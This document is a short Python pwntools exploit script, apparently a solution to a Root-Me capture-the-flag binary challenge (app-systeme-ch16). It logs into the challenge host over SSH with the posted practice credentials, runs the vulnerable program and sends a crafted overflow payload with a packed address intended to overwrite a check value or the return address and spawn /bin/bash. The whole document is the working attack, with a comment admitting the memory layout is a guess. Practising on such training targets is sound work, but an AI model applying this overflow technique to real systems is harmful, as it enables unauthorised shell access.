import struct
from pwn import *

s = ssh(host="challenge02.root-me.org", user="app-systeme-ch16", password="app-systeme-ch16", port=2222)

p = s.process(["/challenge/app-systeme/ch16/ch16"])

# check value to call system("/bin/bash")
check_addr = 0xbffffabc

payload = ""
payload += chr(0x08) * 4
# overwrite eip, hopefully, that after buffer it will be the "int check" variable
payload += struct.pack("I", check_addr)

p.sendline(payload)
p.interactive()
